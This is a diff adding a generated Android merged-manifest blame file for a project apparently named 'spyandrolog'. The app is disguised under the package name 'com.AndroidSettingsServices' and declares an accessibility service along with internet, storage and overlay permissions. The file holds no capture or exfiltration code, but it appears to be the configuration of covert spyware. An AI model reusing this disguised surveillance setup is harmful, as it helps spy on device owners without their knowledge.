@@ -1,0 +1,141 @@
+1<?xml version="1.0" encoding="utf-8"?>
+2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+3    package="com.AndroidSettingsServices"
+4    android:versionCode="1"
+5    android:versionName="1.0" >
+6
+7    <uses-sdk
+8        android:minSdkVersion="24"
+9        android:targetSdkVersion="33" />
+10
+11    <!-- Permissions -->
+12
+13    <uses-permission
+13-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:5:2-95
+14        android:name="android.permission.GET_ACCOUNTS"
+14-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:5:19-65
+15        android:maxSdkVersion="22" />
+15-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:5:66-92
+16    <uses-permission android:name="android.permission.INTERNET" />
+16-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:6:2-63
+16-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:6:19-61
+17    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+17-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:7:2-75
+17-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:7:19-73
+18    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+18-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:8:2-74
+18-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:8:19-71
+19    <uses-permission
+19-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:9:2-105
+20        android:name="android.permission.WRITE_EXTERNAL_STORAGE"
+20-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:9:19-75
+21        android:maxSdkVersion="33" />
+21-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:9:76-102
+22    <uses-permission
+22-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:10:2-104
+23        android:name="android.permission.READ_EXTERNAL_STORAGE"
+23-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:10:19-74
+24        android:maxSdkVersion="33" />
+24-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:10:75-101
+25    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+25-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:11:2-74
+25-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:11:19-71
+26    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+26-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:12:3-76
+26-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:12:20-73
+27
+28    <permission
+28-->[androidx.core:core:1.9.0] /home/user/.gradle/caches/transforms-3/c919e84cf21a5073ea88f45ff1a29b85/transformed/core-1.9.0/AndroidManifest.xml:22:5-24:47
+29        android:name="com.AndroidSettingsServices.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
+29-->[androidx.core:core:1.9.0] /home/user/.gradle/caches/transforms-3/c919e84cf21a5073ea88f45ff1a29b85/transformed/core-1.9.0/AndroidManifest.xml:23:9-81
+30        android:protectionLevel="signature" />
+30-->[androidx.core:core:1.9.0] /home/user/.gradle/caches/transforms-3/c919e84cf21a5073ea88f45ff1a29b85/transformed/core-1.9.0/AndroidManifest.xml:24:9-44
+31
+32    <uses-permission android:name="com.AndroidSettingsServices.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" /> <!-- Application -->
+32-->[androidx.core:core:1.9.0] /home/user/.gradle/caches/transforms-3/c919e84cf21a5073ea88f45ff1a29b85/transformed/core-1.9.0/AndroidManifest.xml:26:5-97
+32-->[androidx.core:core:1.9.0] /home/user/.gradle/caches/transforms-3/c919e84cf21a5073ea88f45ff1a29b85/transformed/core-1.9.0/AndroidManifest.xml:26:22-94
+33    <application
+33-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:16:2-47:16
+34        android:allowBackup="true"
+34-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:17:3-29
+35        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
+35-->[androidx.core:core:1.9.0] /home/user/.gradle/caches/transforms-3/c919e84cf21a5073ea88f45ff1a29b85/transformed/core-1.9.0/AndroidManifest.xml:28:18-86
+36        android:debuggable="true"
+37        android:extractNativeLibs="false"
+38        android:icon="@drawable/ic_launcher"
+38-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:18:3-39
+39        android:label="@string/app_name"
+39-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:19:3-35
+40        android:supportsRtl="true"
+40-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:20:3-29
+41        android:testOnly="true"
+42        android:theme="@style/Theme.AppCompat.Light" >
+42-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:21:3-47
+43
+44        <!-- Activities -->
+45
+46        <activity
+46-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:25:3-31:14
+47            android:name="com.MainActivity"
+47-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:26:4-35
+48            android:exported="true" >
+48-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:27:4-27
+49            <intent-filter>
+49-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:28:4-30:20
+50                <action android:name="android.intent.action.MAIN" />
+50-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:29:5-56
+50-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:29:13-54
+51            </intent-filter>
+52        </activity>
+53
+54        <!-- Services -->
+55
+56        <service
+56-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:35:3-46:13
+57            android:name="com.MyAccessibilityService"
+57-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:36:4-45
+58            android:exported="true"
+58-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:39:4-27
+59            android:label="@string/accessibility_service_label"
+59-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:38:4-55
+60            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
+60-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:37:4-70
+61            <intent-filter>
+61-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:40:4-42:20
+62                <action android:name="android.accessibilityservice.AccessibilityService" />
+62-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:41:5-79
+62-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:41:13-77
+63            </intent-filter>
+64
+65            <meta-data
+65-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:43:4-45:59
+66                android:name="android.accessibilityservice"
+66-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:44:5-48
+67                android:resource="@xml/accessibility_service_config" />
+67-->/home/user/StudioProjects/spyandrolog/app/src/main/AndroidManifest.xml:45:5-57
+68        </service>
+69
+70        <provider
+70-->[androidx.emoji2:emoji2:1.2.0] /home/user/.gradle/caches/transforms-3/28b0d3718afd4f3f82d719b2bf3617f4/transformed/emoji2-1.2.0/AndroidManifest.xml:24:9-32:20
+71            android:name="androidx.startup.InitializationProvider"
+71-->[androidx.emoji2:emoji2:1.2.0] /home/user/.gradle/caches/transforms-3/28b0d3718afd4f3f82d719b2bf3617f4/transformed/emoji2-1.2.0/AndroidManifest.xml:25:13-67
+72            android:authorities="com.AndroidSettingsServices.androidx-startup"
+72-->[androidx.emoji2:emoji2:1.2.0] /home/user/.gradle/caches/transforms-3/28b0d3718afd4f3f82d719b2bf3617f4/transformed/emoji2-1.2.0/AndroidManifest.xml:26:13-68
+73            android:exported="false" >
+73-->[androidx.emoji2:emoji2:1.2.0] /home/user/.gradle/caches/transforms-3/28b0d3718afd4f3f82d719b2bf3617f4/transformed/emoji2-1.2.0/AndroidManifest.xml:27:13-37
+74            <meta-data
+74-->[androidx.emoji2:emoji2:1.2.0] /home/user/.gradle/caches/transforms-3/28b0d3718afd4f3f82d719b2bf3617f4/transformed/emoji2-1.2.0/AndroidManifest.xml:29:13-31:52
+75                android:name="androidx.emoji2.text.EmojiCompatInitializer"
+75-->[androidx.emoji2:emoji2:1.2.0] /home/user/.gradle/caches/transforms-3/28b0d3718afd4f3f82d719b2bf3617f4/transformed/emoji2-1.2.0/AndroidManifest.xml:30:17-75
+76                android:value="androidx.startup" />
+76-->[androidx.emoji2:emoji2:1.2.0] /home/user/.gradle/caches/transforms-3/28b0d3718afd4f3f82d719b2bf3617f4/transformed/emoji2-1.2.0/AndroidManifest.xml:31:17-49
+77            <meta-data
+77-->[androidx.lifecycle:lifecycle-process:2.4.1] /home/user/.gradle/caches/transforms-3/ca7116fbea5f6fb471862e34cf4b3aee/transformed/lifecycle-process-2.4.1/AndroidManifest.xml:31:13-33:52
+78                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
+78-->[androidx.lifecycle:lifecycle-process:2.4.1] /home/user/.gradle/caches/transforms-3/ca7116fbea5f6fb471862e34cf4b3aee/transformed/lifecycle-process-2.4.1/AndroidManifest.xml:32:17-78
+79                android:value="androidx.startup" />
+79-->[androidx.lifecycle:lifecycle-process:2.4.1] /home/user/.gradle/caches/transforms-3/ca7116fbea5f6fb471862e34cf4b3aee/transformed/lifecycle-process-2.4.1/AndroidManifest.xml:33:17-49
+80        </provider>
+81    </application>
+82
+83</manifest>
